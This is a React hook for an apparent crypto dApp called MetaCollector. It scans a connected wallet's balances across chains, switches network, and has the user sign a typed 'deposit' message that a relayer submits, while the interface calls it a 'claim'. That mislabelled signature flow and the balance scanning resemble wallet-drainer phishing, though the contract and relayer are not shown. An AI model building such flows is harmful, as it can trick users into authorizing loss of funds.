import { useState, useEffect, useCallback } from 'react'
import { useAccount, useWalletClient, useSwitchChain, useChainId, useDisconnect } from 'wagmi'
import { useAppKit } from '@reown/appkit/react'
import { ethers } from 'ethers'
import { 
  METACOLLECTOR_CONTRACTS, 
  NETWORK_PRIORITY
} from '../config/contracts'
import { 
  checkBalancesAcrossNetworks, 
  getEligibleNetworks, 
  getBestNetwork 
} from '../utils/balanceChecker'
import { createDepositSignature, verifySignatureLocally } from '../utils/signature'
import { submitDepositViaRelayer, checkRelayerHealth } from '../utils/relayer'

export function useMetaCollector() {
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const chainId = useChainId()
  const { switchChain } = useSwitchChain()
  const { disconnect } = useDisconnect()
  const { open } = useAppKit()

  const [loading, setLoading] = useState(false)
  const [claimLoading, setClaimLoading] = useState(false)
  const [balanceResults, setBalanceResults] = useState(null)
  const [eligibleNetworks, setEligibleNetworks] = useState([])
  const [bestNetwork, setBestNetwork] = useState(null)
  const [relayerHealth, setRelayerHealth] = useState(null)
  const [transactionStatus, setTransactionStatus] = useState(null)
  const [nonce, setNonce] = useState(0)

  useEffect(() => {
    checkHealth()
  }, [])

  useEffect(() => {
    if (isConnected && address) {
      checkBalances()
    } else {
      setBalanceResults(null)
      setEligibleNetworks([])
      setBestNetwork(null)
    }
  }, [isConnected, address])

  const checkHealth = async () => {
    try {
      const health = await checkRelayerHealth()
      setRelayerHealth(health)
    } catch (error) {
      console.error('Failed to check relayer health:', error)
    }
  }

  const checkBalances = async () => {
    if (!address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    setLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Checking wallet balances across networks...'
    })

    try {
      const results = await checkBalancesAcrossNetworks(address)
      setBalanceResults(results)
      
      const eligible = getEligibleNetworks(results)
      setEligibleNetworks(eligible)
      
      const best = getBestNetwork(eligible, NETWORK_PRIORITY)
      setBestNetwork(best)
      
      setNonce(Math.floor(Math.random() * 1000000))

      if (eligible.length === 0) {
        setTransactionStatus({
          type: 'info',
          message: 'No network has sufficient balance (need ~$1 worth of gas)'
        })
      } else {
        setTransactionStatus({
          type: 'success',
          message: `✅ Funds available on ${eligible.length} network(s)!`
        })
      }
    } catch (error) {
      console.error('Balance check failed:', error)
      setTransactionStatus({
        type: 'error',
        message: `Failed to check balances: ${error.message}`
      })
    } finally {
      setLoading(false)
    }
  }

  const getEthersSigner = useCallback(async () => {
    if (!walletClient) {
      throw new Error('No wallet client available')
    }

    const { transport } = walletClient
    const provider = new ethers.BrowserProvider(transport, 'any')
    return await provider.getSigner()
  }, [walletClient])

  const claimDeposit = async () => {
    if (!isConnected || !address) {
      setTransactionStatus({
        type: 'error',
        message: 'Please connect your wallet first'
      })
      return
    }

    if (!bestNetwork) {
      setTransactionStatus({
        type: 'error',
        message: 'No eligible network found with sufficient balance'
      })
      return
    }

    setClaimLoading(true)
    setTransactionStatus({
      type: 'pending',
      message: 'Preparing claim transaction...'
    })

    try {
      if (chainId !== bestNetwork.chainId) {
        setTransactionStatus({
          type: 'pending',
          message: `Switching to ${bestNetwork.networkName}...`
        })
        
        await switchChain({ chainId: bestNetwork.chainId })
        await new Promise(resolve => setTimeout(resolve, 2000))
      }

      const signer = await getEthersSigner()
      
      const signerAddress = await signer.getAddress()
      if (signerAddress.toLowerCase() !== address.toLowerCase()) {
        throw new Error('Signer address mismatch')
      }

      setTransactionStatus({
        type: 'pending',
        message: 'Creating signature...'
      })

      const claimAmount = '0.001'

      // DEBUG: Log everything before signing
      console.log('========== DEBUG SIGNATURE CREATION ==========')
      console.log('1. Network:', bestNetwork.networkName)
      console.log('2. Chain ID:', bestNetwork.chainId)
      console.log('3. Contract Address:', bestNetwork.contractAddress)
      console.log('4. User:', address)
      console.log('5. Amount:', claimAmount)
      console.log('6. Nonce:', nonce)
      console.log('==============================================')

      const signaturePayload = await createDepositSignature({
        signer,
        contractAddress: bestNetwork.contractAddress,
        chainId: bestNetwork.chainId,
        user: address,
        amount: claimAmount,
        nonce
      })

      // DEBUG: Log the full payload
      console.log('========== SIGNATURE PAYLOAD ==========')
      console.log('DOMAIN:', JSON.stringify(signaturePayload.domain, null, 2))
      console.log('TYPES:', JSON.stringify(signaturePayload.types, null, 2))
      console.log('VALUE:', JSON.stringify(signaturePayload.value, null, 2))
      console.log('SIGNATURE:', signaturePayload.signature)
      console.log('EXPECTED SIGNER:', signaturePayload.expectedSigner)
      console.log('========================================')

      // Verify locally
      console.log('🔍 Verifying signature locally...')
      const isValid = verifySignatureLocally(signaturePayload)
      
      if (!isValid) {
        console.error('❌ Local signature verification failed')
        
        // Try to recover the address manually for debugging
        try {
          const { domain, types, value } = signaturePayload
          const valueForVerification = {
            user: value.user,
            amount: ethers.parseEther(value.amount.toString()),
            nonce: value.nonce
          }
          
          const recovered = ethers.verifyTypedData(
            domain,
            types,
            valueForVerification,
            signaturePayload.signature
          )
          
          console.log('🔍 MANUAL VERIFICATION:')
          console.log('Recovered address:', recovered)
          console.log('Expected address:', address)
          console.log('Match:', recovered.toLowerCase() === address.toLowerCase() ? '✅' : '❌')
          
          if (recovered.toLowerCase() !== address.toLowerCase()) {
            console.log('⚠️ Addresses do not match! This is the root cause.')
          }
        } catch (manualError) {
          console.error('Manual verification also failed:', manualError)
        }
        
        throw new Error('Signature verification failed locally - check console for details')
      }
      console.log('✅ Local signature verification passed')

      setTransactionStatus({
        type: 'pending',
        message: 'Submitting to relayer...'
      })

      const result = await submitDepositViaRelayer({
        contractAddress: bestNetwork.contractAddress,
        signaturePayload
      })

      setTransactionStatus({
        type: 'success',
        message: `✅ Claim successful on ${result.network}!`,
        hash: result.hash
      })

      setTimeout(() => checkBalances(), 5000)

    } catch (error) {
      console.error('❌ Claim failed:', error)
      setTransactionStatus({
        type: 'error',
        message: `Claim failed: ${error.message}`
      })
    } finally {
      setClaimLoading(false)
    }
  }

  const handleConnect = () => {
    open()
  }

  const handleDisconnect = async () => {
    try {
      await disconnect()
      setBalanceResults(null)
      setEligibleNetworks([])
      setBestNetwork(null)
      setTransactionStatus(null)
    } catch (error) {
      console.error('Disconnect error:', error)
    }
  }

  return {
    address,
    isConnected,
    loading,
    claimLoading,
    balanceResults,
    eligibleNetworks,
    bestNetwork,
    relayerHealth,
    transactionStatus,
    checkBalances,
    claimDeposit,
    handleConnect,
    handleDisconnect,
    nonce
  }
}
